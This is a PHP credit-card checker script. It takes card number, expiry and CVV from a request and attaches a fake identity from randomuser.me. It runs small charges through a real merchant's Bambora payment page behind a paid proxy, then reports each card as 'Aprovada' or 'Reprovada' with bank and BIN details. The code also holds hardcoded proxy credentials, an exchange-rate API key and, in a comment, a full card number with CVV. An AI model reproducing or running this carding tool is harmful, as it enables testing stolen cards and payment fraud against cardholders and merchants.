<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc  = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

 

$random = rand(10000, 10000000); 

$max = 1.2;
$min = 00.99;
for ($i = 0; $i < 1; ++$i)
{
    $range = $max - $min;
    $num = $min + $range * (mt_rand() / mt_getrandmax());    
    $num = round($num, 2);
	$num = urlencode($num);

}


$max = 0.01;
$min = 0.19;
for ($i = 0; $i < 1; ++$i)
{
    $range = $max - $min;
    $usd = $min + $range * (mt_rand() / mt_getrandmax());    
    $usd = round($usd, 2);
  $usd = urlencode($usd);
}



  

  $CardType = substr($cc, 0, 1);
  if($CardType=="6"){ $CardType="NN"; //DISCOVER 
  }else if($CardType=="4"){ $CardType="VI";  //VISA
  }else if($CardType=="5"){ $CardType="MC"; //MASTER 
  }else if($CardType=="2"){ $CardType="MC"; //MASTER 
  }else if($CardType=="3"){ $CardType="AM"; // AMEX
    }


    $username = 'blue3419ankj16047'; 
    $password = 'ku9VsvUjT7gv7oOx'; 
    $proxy = 'isp2.hydraproxy.com:9989';
    

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIE, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $resposta = curl_exec($ch);
    $firstname = getStr($resposta, '"first":"', '"');
    $lastname = getStr($resposta, '"last":"', '"');
    $phone = getStr($resposta, 'phone":"', '"');
    $zip = getStr($resposta, '"postcode":', ',"');  
    $state = getStr($resposta, 'state":"', '"');
    $state_full = getStr($resposta, 'state":"', '"');
    $email = getStr($resposta, 'email":"', '"');
    $city = getStr($resposta, 'city":"', '"');
    $street = getStr($resposta, '"name":"', '"}');
    $number = getStr($resposta, '"number":', ',"');
    $numero1 = substr($phone, 1, 3);
    $numero2 = substr($phone, 6, 3);
    $numero3 = substr($phone, 10, 4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","homtail.com","yahoo.com","ymail.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email= str_replace("example.com", $serv_rnd, $email);
    if($state=="Alabama"){ $state="AL";
  }else if($state=="Alaska"){ $state="AK";
  }else if($state=="Arizona"){ $state="AR";
  }else if($state=="California"){ $state="CA";
  }else if($state=="Olorado"){ $state="CO";
  }else if($state=="Connecticut"){ $state="CT";
  }else if($state=="Delaware"){ $state="DE";
  }else if($state=="District of columbia"){ $state="DC";
  }else if($state=="Florida"){ $state="FL";
  }else if($state=="Georgia"){ $state="GA";
  }else if($state=="Hawaii"){ $state="HI";
  }else if($state=="Idaho"){ $state="ID";
  }else if($state=="Illinois"){ $state="IL";
  }else if($state=="Indiana"){ $state="IN";
  }else if($state=="Iowa"){ $state="IA";
  }else if($state=="Kansas"){ $state="KS";
  }else if($state=="Kentucky"){ $state="KY";
  }else if($state=="Louisiana"){ $state="LA";
  }else if($state=="Maine"){ $state="ME";
  }else if($state=="Maryland"){ $state="MD";
  }else if($state=="Massachusetts"){ $state="MA";
  }else if($state=="Michigan"){ $state="MI";
  }else if($state=="Minnesota"){ $state="MN";
  }else if($state=="Mississippi"){ $state="MS";
  }else if($state=="Missouri"){ $state="MO";
  }else if($state=="Montana"){ $state="MT";
  }else if($state=="Nebraska"){ $state="NE";
  }else if($state=="Nevada"){ $state="NV";
  }else if($state=="New Hampshire"){ $state="NH";
  }else if($state=="New Jersey"){ $state="NJ";
  }else if($state=="New Mexico"){ $state="NM";
  }else if($state=="New York"){ $state="LA";
  }else if($state=="North Carolina"){ $state="NC";
  }else if($state=="North Dakota"){ $state="ND";
  }else if($state=="Ohio"){ $state="OH";
  }else if($state=="Oklahoma"){ $state="OK";
  }else if($state=="Oregon"){ $state="OR";
  }else if($state=="Pennsylvania"){ $state="PA";
  }else if($state=="Rhode Island"){ $state="RI";
  }else if($state=="South Carolina"){ $state="SC";
  }else if($state=="South Dakota"){ $state="SD";
  }else if($state=="Tennessee"){ $state="TN";
  }else if($state=="Texas"){ $state="TX";
  }else if($state=="Utah"){ $state="UT";
  }else if($state=="Vermont"){ $state="VT";
  }else if($state=="Virginia"){ $state="VA";
  }else if($state=="Washington"){ $state="WA";
  }else if($state=="West Virginia"){ $state="WV";
  }else if($state=="Wisconsin"){ $state="WI";
  }else if($state=="Wyoming"){ $state="WY";
  }else if($state=="Colorado"){ $state="CO";
  
  
  }else if($state=="Alberta"){ $state="AB"; 
  }else if($state=="British Columbia"){ $state="BC"; 
  }else if($state=="Manitoba"){ $state="MB"; 
  }else if($state=="New Brunswick"){ $state="NB"; 
  }else if($state=="Newfoundland and Labrador"){ $state="NL"; 
  }else if($state=="Northwest Territories"){ $state="NT"; 
  }else if($state=="Nova Scotia"){ $state="NS"; 
  }else if($state=="Nunavut"){ $state="NU"; 
  }else if($state=="Ontario"){ $state="ON"; 
  }else if($state=="Prince Edward Island"){ $state="WY"; 
  }else if($state=="Québec"){ $state="QC"; 
  }else if($state=="Saskatchewan"){ $state="SK"; 
  }else if($state=="Yukon"){ $state="YT"; 
  }


  $email1 = $email;
  $email1 = urlencode($email1);
  $email1 = str_replace('@', '%40', $email1);

  $email2 = $email;
  $email2 = urlencode($email2);
  $email2 = str_replace('@', '%40', $email2);
  $email2 = str_replace('.', '%2E', $email2);

  $street = urlencode($street);


  
  $req_url = 'https://v6.exchangerate-api.com/v6/307d78ab02637dbd7dd56e5c/latest/USD';
  $response_json = file_get_contents($req_url);
  // Continuing if we got a result
  if(false !== $response_json) {
      // Try/catch for json_decode operation
      try {
      // Decoding
      $response = json_decode($response_json);
      // Check for success
      if('success' === $response->result) {
        // YOUR APPLICATION CODE HERE, e.g.
        $base_price = $usd; // Your price in USD
        $BRL_price = round(($base_price * $response->conversion_rates->BRL), 2);
      }
      }
      catch(Exception $e) {
          // Handle JSON parse error...
      }
  }


$chave = '376293864';
$url = 'https://web.na.bambora.com/scripts/payment/payment.asp?merchant_id=376293864&trnLanguage=eng&preview=true&trnAmount=5.00&hashValue=fef7d895f5f5d01bc3dc6a45c1af9b0867307511';


  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
  $d1 = curl_exec($ch);
  $sessionToken = getStr($d1, '<input type="hidden" id="sessionToken" name="sessionToken" value="', '">');

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://web.na.bambora.com/scripts/payment/payment.asp');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_PROXY, $proxy); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
  curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
    'Host: web.na.bambora.com',
    'Cache-Control: max-age=0',
    'Upgrade-Insecure-Requests: 1',
    'Origin: https://web.na.bambora.com',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
   // 'Referer: https://web.na.bambora.com/scripts/payment/payment.asp?merchant_id='.$chave.'&hashValue='.$hash.'',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    ));
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'sessionToken='.$sessionToken.'&paymentAction=&merchant_id='.$chave.'&preview=true&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm=&trnAmount='.$num.'&paymentMethod=CC&trnCardType='.$CardType.'&trnCardOwner='.$firstname.'+'.$lastname.'&trnCardNumber='.$cc.'&trnExpMonth='.$mes.'&trnExpYear='.$ano.'&trnCardCvd='.$cvv.'&ordName='.$firstname.'+'.$lastname.'&ordEmailAddress='.$email1.'&ordPhoneNumber='.$phone.'&ordAddress1='.trim(urlencode($street)).'&ordAddress2=&ordCity='.trim(urlencode($city)).'&ordPostalCode='.$zip.'&ordProvince='.$state.'&ordCountry=US&shipName=&shipEmailAddress=&shipPhoneNumber=&shipAddress1=&shipAddress2=&shipCity=&shipPostalCode=&shipProvince=&shipCountry=');
  $d2 = curl_exec($ch); 
  echo $d2;
  $payFormParams = getStr($d2, '<input type="hidden" name="payFormParams" id="payFormParams" value="', '">');
  $payFormParams = str_replace('amp;', '', $payFormParams);

//sessionToken=4737F3F3-8C19-4CEF-8F7B31FF92FAD&paymentAction=&merchant_id=376293864&preview=true&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm=&trnAmount=2.50&paymentMethod=CC&trnCardType=NN&trnCardOwner=aDA+FELIX&trnCardNumber=6504859941137249&trnExpMonth=06&trnExpYear=24&trnCardCvd=164&ordName=Ada+Felix&ordEmailAddress=adajr%40ymail.com&ordPhoneNumber=3058749774&ordAddress1=Live+Street&ordAddress2=&ordCity=New+York&ordPostalCode=10013&ordProvince=NY&ordCountry=US&shipName=&shipEmailAddress=&shipPhoneNumber=&shipAddress1=&shipAddress2=&shipCity=&shipPostalCode=&shipProvince=&shipCountry=&trnComments=


  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://web.na.bambora.com/scripts/process_transaction.asp');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password"); 
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/cookie'.$random.'.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: web.na.bambora.com',
  'Cache-Control: max-age=0',
  'Upgrade-Insecure-Requests: 1',
  'Origin: https://web.na.bambora.com',
  'Content-Type: application/x-www-form-urlencoded',
  'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'Referer: https://web.na.bambora.com/scripts/payment/payment.asp',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
	));
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ''.$payFormParams.'');
$d3 = curl_exec($ch);


include('simple_html_dom.php');
$html = str_get_html($d3); 
$rows = $html->find('td'); 
	 $id = $html->find('td', 4)->plaintext;
	 $bank_msg = $html->find('td', 6)->plaintext;



   $bin = substr($cc, 0, 6);
   $file = 'bins.csv';
   $searchfor = $bin; 
   $contents = file_get_contents($file);
   $pattern = preg_quote($searchfor, '/');
   $pattern = "/^.*$pattern.*\$/m";
   if (preg_match_all($pattern, $contents, $matches)) {
       $encontrada = implode("\n", $matches[0]);
   }
   $pieces = explode(";", $encontrada);
   $c = count($pieces);
   if ($c == 8) {
       $bandeira = $pieces[1];
       $banco = $pieces[2];
       $tipo = $pieces[3];
       $level = $pieces[4];
       $pais = $pieces[5];
       
    
   } else {
       $bandeira = $pieces[1];
       $banco = $pieces[2];
       $tipo = $pieces[3];
       $level = $pieces[4];
       $pais = $pieces[5];
    
   }


  if(stristr($d3,'<td>App') !== false){ //Aprovado vamos retirar um valor específico 
    
    $CSRFToken = csrf_token(); // _token
    $encrypter = app('Illuminate\Encryption\Encrypter');      
    $encrypted_token = $encrypter->encrypt(csrf_token());   //XSRF-TOKEN encrypted
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://localhost/admin/withdraw');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
      'Host: localhost',
      'Connection: keep-alive',
      'Cache-Control: max-age=0',
      'Origin: http://localhost',
      'Content-Type: application/x-www-form-urlencoded',
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'Referer: http://localhost/admin/deposit',
      'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
      'Cookie: XSRF-TOKEN='.trim(urlencode($encrypted_token)).'; laravel_session='.$_COOKIE['laravel_session'].'',
      ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '_token='.$CSRFToken.'&value=1&value=1');
    $saldo = curl_exec($ch); 
  }

  
  if(stristr($saldo,'Sucesso ao Retirar') !== false){   //Opa Retirei R$ 1 da sua conta
    echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$lista.' -> Informações: '.$bandeira.' '.$banco.' '.$tipo.' '.$level.'('.$pais.') Retorno: Debitou (R$ '.$BRL_price.') <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
		
	 }


else{
        echo '       
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$lista.' -> Informações: '.$bandeira.' '.$banco.' '.$tipo.' '.$level.'('.$pais.') Retorno: Negou (R$ '.$BRL_price.') <strong>  -   Response: '.$bank_msg.' '.$id.'</strong></p>
                                  </div>
 
                         
  </div>
                                </div>
';


}


        
 curl_close($ch);
 ob_flush();        
                    
             
?>
